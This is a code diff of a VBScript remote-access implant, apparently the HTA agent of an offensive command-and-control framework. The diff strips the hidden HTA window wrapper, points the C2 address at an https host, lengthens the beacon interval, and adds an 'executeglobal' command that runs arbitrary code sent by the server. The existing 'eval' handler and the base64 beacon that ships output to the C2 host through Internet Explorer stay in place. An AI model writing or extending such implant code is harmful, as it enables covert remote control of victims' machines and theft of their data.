@@ -1,14 +1,5 @@
-<head>
-<HTA:APPLICATION 
-     SHOWINTASKBAR="no"
->
-</head>
-<script language="VBScript">
-On Error Resume Next
-window.moveTo -2000,-2000
-
-C2 = "192.168.5.4"
-sleepInterval = 1 * 2000
+C2 = "https://"
+sleepInterval = 151 * 1000
 outBuffer = ""
 
 Function Base64Encode(sText)
@@ -112,6 +103,8 @@ Function parseMessage(buf)
                 If newInterval > 0 Then
                     sleepInterval = newInterval 
                 End If
+            ElseIf message = "executeglobal" Then
+                ExecuteGlobal data
             ElseIf message = "eval" Then
                 ret = Cstr(Eval(data))
                 outBuffer = outBuffer + ret 
@@ -164,16 +157,10 @@ Function daLoop()
         Replace b, "+", "%2B"
         Replace b, "/", "%2F"
         Replace b, "=", "%3D"
-        objIE.Navigate2 "http://" & C2 & "/" & b, 14
+        objIE.Navigate2 C2 & "/" & b, 14
     End If
 
     a = window.setTimeout("daLoop", sleepInterval, "VBScript")
 End Function
 
 daLoop()
-
-
-
-</script>
-<body>
-</body>
